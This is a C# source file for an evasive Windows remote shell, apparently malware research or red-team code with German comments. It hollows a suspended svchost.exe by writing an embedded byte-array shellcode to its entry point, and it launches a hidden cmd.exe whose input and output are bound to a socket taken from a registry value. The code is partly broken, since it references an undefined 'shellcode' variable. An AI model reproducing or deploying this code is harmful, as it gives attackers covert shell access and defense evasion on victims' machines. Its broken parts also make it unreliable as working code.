using System.Net.Sockets;
using System.Runtime.InteropServices;
using System;
using SocketHelpers;
using Microsoft.Win32;

namespace EvasiveShell_SocketConnection
{
  internal class Program
  {
    [StructLayout(LayoutKind.Sequential)]
    public struct sockaddr_in
    {
      public short sin_family;

      public ushort sin_port;

      public in_addr sin_addr;

      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
      public string sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct in_addr
    {
      public uint S_addr;
    }

    /// <summary>
    /// Importierte Methode um ein Socket zu connecten.
    /// Dokumentation: https://learn.microsoft.com/de-de/windows/win32/api/winsock2/nf-winsock2-connect
    /// </summary>
    /// <param name="socket">Das Socket.</param>
    /// <param name="name">Pointer auf eine SockAddr Struktur. <see cref="https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2"/></param>
    /// <param name="namelen">Länge der Sockaddr Struktur</param>
    /// <returns></returns>
    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern int connect(IntPtr socket, IntPtr name, int namelen);

    [DllImport("kernel32.dll")]
    public static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("ntdll.dll")]
    public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);


    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
      public IntPtr ExitStatus;
      public IntPtr PebAddress;
      public IntPtr AffinityMask;
      public IntPtr BasePriority;
      public IntPtr UniquePID;
      public IntPtr InheritedFromUniqueProcessId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
      public Int32 cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public Int32 dwX;
      public Int32 dwY;
      public Int32 dwXSize;
      public Int32 dwYSize;
      public Int32 dwXCountChars;
      public Int32 dwYCountChars;
      public Int32 dwFillAttribute;
      public uint dwFlags;
      public Int16 wShowWindow;
      public Int16 cbReserved2;
      public IntPtr lpReserved2;
      public IntPtr hStdInput;
      public IntPtr hStdOutput;
      public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
      public IntPtr hProcess;
      public IntPtr hThread;
      public int dwProcessId;
      public int dwThreadId;
    }

    public static class CreationFlags
    {
      public const uint SUSPENDED = 0x4;
      public const uint CREATE_NO_WINDOW = 0x8000000;
      public const uint STARTF_USESTDHANDLES = 0x100;
    }

    /// <summary>
    /// Importierte Methode um Socket zu erzeugen.
    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
    /// </summary>
    /// <param name="af">Address family. Wert von 2 entspricht IPv4.</param>
    /// <param name="type">Socket Type. Wert von 1 entspricht stream.</param>
    /// <param name="protocol">Protokoll. Wert von 6 entspricht tcp.</param>
    /// <param name="protocolInfo">Kann NULL sein.</param>
    /// <param name="group">Kann NULL sein.</param>
    /// <param name="dwFlags">Kann NULL sein.</param>
    /// <returns></returns>
    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern IntPtr WSASocketA(int af, int type, int protocol, ref WSAPROTOCOL_INFO protocolInfo, int group, int dwFlags);

    public struct WSAPROTOCOL_INFO
    {
      public uint dwServiceFlags1;
      public uint dwServiceFlags2;
      public uint dwServiceFlags3;
      public uint dwServiceFlags4;
      public uint dwProviderFlags;
      public Guid ProviderId;
      public uint dwCatalogEntryId;
      public WSAPROTOCOLCHAIN ProtocolChain;
      public int iVersion;
      public int iAddressFamily;
      public int iMaxSockAddr;
      public int iMinSockAddr;
      public int iSocketType;
      public int iProtocol;
      public int iProtocolMaxOffset;
      public int iNetworkByteOrder;
      public int iSecurityScheme;
      public uint dwMessageSize;
      public uint dwProviderReserved;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
      public byte[] szProtocol;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WSAPROTOCOLCHAIN
    {
      public int ChainLen;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 7)]
      public uint[] ChainEntries;
    }

    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern ushort htons(ushort port);

    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern uint inet_addr(string ipAddress);


    static void Main(string[] args)
    {
      Helpers.InitializeWSA();

      bool exists = false;
      string value = string.Empty;

      do
      {
        var obj = Registry.GetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "SessionData", null);
        exists = !string.IsNullOrWhiteSpace(obj?.ToString());

        if (exists)
          value = obj.ToString();

        Thread.Sleep(20);
      }
      while (!exists);

      ConnectEvasive();

      var protocolInfo = DeserializeProtocolInfo(Convert.FromBase64String(value));
      IntPtr socket = WSASocketA(2, 1, 6, ref protocolInfo, 0, 0);
      
      if (socket == IntPtr.Zero)
        Environment.Exit(1);

      var socketHandle = new SafeSocketHandle(socket, false);
      STARTUPINFO startupInfo = new STARTUPINFO();
      Marshal.AllocHGlobal(Marshal.SizeOf(startupInfo));
      startupInfo.cb = Marshal.SizeOf(startupInfo);
      startupInfo.dwFlags = CreationFlags.STARTF_USESTDHANDLES;
      startupInfo.hStdInput = socketHandle.DangerousGetHandle();
      startupInfo.hStdOutput = socketHandle.DangerousGetHandle();
      startupInfo.hStdError = socketHandle.DangerousGetHandle();

      // Creating cmd process hopefully.
      PROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
      CreateProcessA(null, @"C:\\Windows\\System32\\cmd.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);

      Console.WriteLine("Create success");
    }

    private static void ConnectEvasive()
    {
      byte[] byteArray = new byte[]
      {
    0x8D, 0x4C, 0x24, 0x04, 0x83, 0xE4, 0xF0, 0x0A, 0xFF, 0x71, 0xFC, 0x55,
    0x89, 0xE5, 0x51, 0x81, 0xEC, 0xC4, 0x07, 0x00, 0x00, 0xE8, 0x00, 0x00,
    0x00, 0x00, 0xCA, 0xC7, 0x45, 0xF4, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x45,
    0xF0, 0x3C, 0x00, 0x00, 0x00, 0xC7, 0x85, 0xD8, 0xFB, 0xFF, 0xFF, 0xC7,
    0x45, 0xEC, 0xBB, 0x01, 0x00, 0x00, 0x8D, 0x45, 0xE0, 0x89, 0x44, 0x24,
    0x10, 0xC7, 0x44, 0x24, 0x0C, 0x19, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24,
    0x08, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x45, 0xF4, 0x89, 0x44, 0x24, 0x04,
    0xC7, 0x04, 0x24, 0x01, 0x00, 0x00, 0x00, 0xA1, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xD0, 0xCA, 0x83, 0xEC, 0x14, 0x8B, 0x55, 0xE0, 0x8D, 0x85, 0xD8,
    0xFB, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x14, 0x8D, 0x85, 0xDC, 0xFB, 0xFF,
    0xFF, 0x89, 0x44, 0x24, 0x10, 0x8D, 0x45, 0xDC, 0x89, 0x44, 0x24, 0x0C,
    0xC7, 0x44, 0x24, 0x08, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x45, 0xF0, 0x89,
    0x44, 0x24, 0x04, 0x89, 0x14, 0x24, 0xA1, 0x00, 0x00, 0x00, 0x00, 0xFF,
    0xD0, 0xCA, 0x83, 0xEC, 0x18, 0xC7, 0x04, 0x24, 0x32, 0x00, 0x00, 0x00,
    0xA1, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0xCA, 0x83, 0xEC, 0x04, 0x8D,
    0x85, 0xDC, 0xFB, 0xFF, 0xFF, 0x0F, 0xB6, 0x00, 0x84, 0xC0, 0x74, 0xA8,
    0x8B, 0x45, 0xE0, 0x89, 0x04, 0x24, 0xA1, 0x00, 0x00, 0x00, 0x00, 0xFF,
    0xD0, 0xCA, 0x83, 0xEC, 0x04, 0x8D, 0x85, 0xD0, 0xFB, 0xFF, 0xFF, 0x89,
    0x44, 0x24, 0x08, 0x8D, 0x85, 0xD4, 0xFB, 0xFF, 0xFF, 0x89, 0x44, 0x24,
    0x04, 0x8D, 0x85, 0xDC, 0xFB, 0xFF, 0xFF, 0x89, 0x04, 0x24, 0xE8, 0xAB,
    0x01, 0x00, 0x00, 0xCA, 0x8B, 0x8D, 0xD0, 0xFB, 0xFF, 0xFF, 0x8B, 0x95,
    0xD4, 0xFB, 0xFF, 0xFF, 0x8D, 0x85, 0x5C, 0xFA, 0xFF, 0xFF, 0x89, 0x4C,
    0x24, 0x08, 0x89, 0x54, 0x24, 0x04, 0x89, 0x04, 0x24, 0xE8, 0x59, 0x02,
    0x00, 0x00, 0xCA, 0x8D, 0x85, 0xCC, 0xF8, 0xFF, 0xFF, 0x89, 0x44, 0x24,
    0x04, 0xC7, 0x04, 0x24, 0x02, 0x02, 0x00, 0x00, 0xA1, 0x00, 0x00, 0x00,
    0x00, 0xFF, 0xD0, 0xCA, 0x83, 0xEC, 0x08, 0xC7, 0x44, 0x24, 0x14, 0x00,
    0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x10, 0x00, 0x00, 0x00, 0x00, 0x8D,
    0x85, 0x5C, 0xFA, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x0C, 0xC7, 0x44, 0x24,
    0x08, 0x06, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x04, 0x01, 0x00, 0x00,
    0x00, 0xC7, 0x04, 0x24, 0x02, 0x00, 0x00, 0x00, 0xA1, 0x00, 0x00, 0x00,
    0x00, 0xFF, 0xD0, 0xCA, 0x83, 0xEC, 0x18, 0x89, 0x45, 0xE8, 0x66, 0xC7,
    0x85, 0xBC, 0xF8, 0xFF, 0xFF, 0x8B, 0x45, 0xEC, 0x0F, 0xB7, 0xC0, 0x89,
    0x04, 0x24, 0xA1, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0xCA, 0x83, 0xEC,
    0x04, 0x66, 0x89, 0x85, 0xBE, 0xF8, 0xFF, 0xFF, 0xC7, 0x04, 0x24, 0x48,
    0x00, 0x00, 0x00, 0xA1, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0xCA, 0x83,
    0xEC, 0x04, 0x89, 0x85, 0xC0, 0xF8, 0xFF, 0xFF, 0xC7, 0x44, 0x24, 0x08,
    0x10, 0x00, 0x00, 0x00, 0x8D, 0x85, 0xBC, 0xF8, 0xFF, 0xFF, 0x89, 0x44,
    0x24, 0x04, 0x8B, 0x45, 0xE8, 0x89, 0x04, 0x24, 0xA1, 0x00, 0x00, 0x00,
    0x00, 0xFF, 0xD0, 0xCA, 0x83, 0xEC, 0x0C, 0xA1, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xD0, 0xCA, 0x89, 0x45, 0xE4, 0x8B, 0x45, 0xE4, 0x89, 0x44, 0x24,
    0x04, 0xC7, 0x04, 0x24, 0x56, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00,
    0x00, 0xCA, 0xC7, 0x44, 0x24, 0x08, 0x44, 0x00, 0x00, 0x00, 0xC7, 0x44,
    0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0x8D, 0x85, 0x78, 0xF8, 0xFF, 0xFF,
    0x89, 0x04, 0x24, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xCA, 0xC7, 0x85, 0x78,
    0xF8, 0xFF, 0xFF, 0xC7, 0x85, 0xA4, 0xF8, 0xFF, 0xFF, 0x8B, 0x45, 0xE8,
    0x89, 0x85, 0xB0, 0xF8, 0xFF, 0xFF, 0x8B, 0x45, 0xE8, 0x89, 0x85, 0xB4,
    0xF8, 0xFF, 0xFF, 0x8B, 0x45, 0xE8, 0x89, 0x85, 0xB8, 0xF8, 0xFF, 0xFF,
    0x8D, 0x85, 0x68, 0xF8, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x24, 0x8D, 0x85,
    0x78, 0xF8, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x20, 0xC7, 0x44, 0x24, 0x1C,
    0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x18, 0x00, 0x00, 0x00, 0x00,
    0xC7, 0x44, 0x24, 0x14, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x10,
    0x01, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x0C, 0x00, 0x00, 0x00, 0x00,
    0xC7, 0x44, 0x24, 0x08, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x04,
    0x59, 0x00, 0x00, 0x00, 0xC7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0xA1,
    0x00, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0xCA, 0x83, 0xEC, 0x28, 0xB8, 0x00,
    0x00, 0x00, 0x00, 0x8B, 0x4D, 0xFC, 0xC9, 0x8D, 0x61, 0xFC, 0xC3, 0x55,
    0x89, 0xE5, 0x83, 0xEC, 0x38, 0xC7, 0x45, 0xF4, 0x00, 0x00, 0x00, 0x00,
    0xC7, 0x44, 0x24, 0x18, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x14,
    0x00, 0x00, 0x00, 0x00, 0x8D, 0x45, 0xF4, 0x89, 0x44, 0x24, 0x10, 0xC7,
    0x44, 0x24, 0x0C, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x08, 0x01,
    0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0x8B,
    0x45, 0x08, 0x89, 0x04, 0x24, 0xA1, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD0,
    0xCA, 0x83, 0xEC, 0x1C, 0x85, 0xC0, 0x75, 0x07, 0xB8, 0x00, 0x00, 0x00,
    0x00, 0xEB, 0x77, 0x8B, 0x45, 0xF4, 0x89, 0x04, 0x24, 0xE8, 0x00, 0x00,
    0x00, 0x00, 0xCA, 0x89, 0xC2, 0x8B, 0x45, 0x0C, 0x89, 0x10, 0x8B, 0x45,
    0x0C, 0x8B, 0x10, 0xC7, 0x44, 0x24, 0x18, 0x00, 0x00, 0x00, 0x00, 0xC7,
    0x44, 0x24, 0x14, 0x00, 0x00, 0x00, 0x00, 0x8D, 0x45, 0xF4, 0x89, 0x44,
    0x24, 0x10, 0x89, 0x54, 0x24, 0x0C, 0xC7, 0x44, 0x24, 0x08, 0x01, 0x00,
    0x00, 0x00, 0xC7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x45,
    0x08, 0x89, 0x04, 0x24, 0xA1, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0xCA,
    0x83, 0xEC, 0x1C, 0x85, 0xC0, 0x75, 0x14, 0x8B, 0x45, 0x0C, 0x8B, 0x00,
    0x89, 0x04, 0x24, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xCA, 0xB8, 0x00, 0x00,
    0x00, 0x00, 0xEB, 0x0D, 0x8B, 0x55, 0xF4, 0x8B, 0x45, 0x10, 0x89, 0x10,
    0xB8, 0x01, 0x00, 0x00, 0x00, 0xC9, 0xC3, 0x55, 0x89, 0xE5, 0x57, 0x56,
    0x53, 0x81, 0xEC, 0x9C, 0x01, 0x00, 0x00, 0x8B, 0x45, 0x10, 0x89, 0x44,
    0x24, 0x08, 0x8B, 0x45, 0x0C, 0x89, 0x44, 0x24, 0x04, 0x8D, 0x85, 0x74,
    0xFE, 0xFF, 0xFF, 0x89, 0x04, 0x24, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xCA,
    0x8B, 0x45, 0x08, 0x89, 0xC3, 0x8D, 0x85, 0x74, 0xFE, 0xFF, 0xFF, 0xBA,
    0x5D, 0x00, 0x00, 0x00, 0x89, 0xDF, 0x89, 0xC6, 0x89, 0xD1, 0xF3, 0xA5,
    0x8B, 0x45, 0x08, 0x81, 0xC4, 0x9C, 0x01, 0x00, 0x00, 0x5B, 0x5E, 0x5F,
    0x5D, 0xC3, 0x90, 0x90 };

      PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();
      STARTUPINFO startup_info = new STARTUPINFO();
      PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
      string targetPath = @"C:\\Windows\\System32\\svchost.exe";
      var procINIT = CreateProcessA(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED,
                      IntPtr.Zero, null, ref startup_info, ref proc_info);

      uint retLength = 0;
      IntPtr procHandle = proc_info.hProcess;
      ZwQueryInformationProcess(procHandle, 0, ref pbi, (uint)(IntPtr.Size * 6), ref retLength);
      IntPtr imageBaseAddr = (IntPtr)((Int64)pbi.PebAddress + 0x10);

      byte[] baseAddrBytes = new byte[0x8];
      IntPtr lpNumberofBytesRead = IntPtr.Zero;
      ReadProcessMemory(procHandle, imageBaseAddr, baseAddrBytes, baseAddrBytes.Length, out lpNumberofBytesRead);
      IntPtr execAddr = (IntPtr)(BitConverter.ToInt64(baseAddrBytes, 0));

      byte[] data = new byte[0x200];
      ReadProcessMemory(procHandle, execAddr, data, data.Length, out lpNumberofBytesRead);

      uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
      Console.WriteLine("[*] e_lfanew: 0x{0}", e_lfanew.ToString("X"));

      uint rvaOffset = e_lfanew + 0x28;
      uint rva = BitConverter.ToUInt32(data, (int)rvaOffset);

      IntPtr entrypointAddr = (IntPtr)((UInt64)execAddr + rva);
      Console.WriteLine("[*] Entrypoint Found: 0x{0}", entrypointAddr.ToString("X"));

      // At this point the entry point address of the process is found and the only thing that is yet required, is to write the
      // actual malicious shellcode into the address space of the process, starting at its base address.
      IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
      WriteProcessMemory(procHandle, entrypointAddr, shellcode, shellcode.Length, ref lpNumberOfBytesWritten);

      // Finally, the process is resumed.
      IntPtr threadHandle = proc_info.hThread;
      ResumeThread(threadHandle);
    }

    private static WSAPROTOCOL_INFO DeserializeProtocolInfo(byte[] arr)
    {
      WSAPROTOCOL_INFO protocolInfo = new WSAPROTOCOL_INFO();
      int size = Marshal.SizeOf(protocolInfo);
      IntPtr ptr = Marshal.AllocHGlobal(size);

      try
      {
        Marshal.Copy(arr, 0, ptr, size);
        protocolInfo = Marshal.PtrToStructure<WSAPROTOCOL_INFO>(ptr);
      }
      finally
      {
        Marshal.FreeHGlobal(ptr);
      }

      return protocolInfo;
    }
  }
}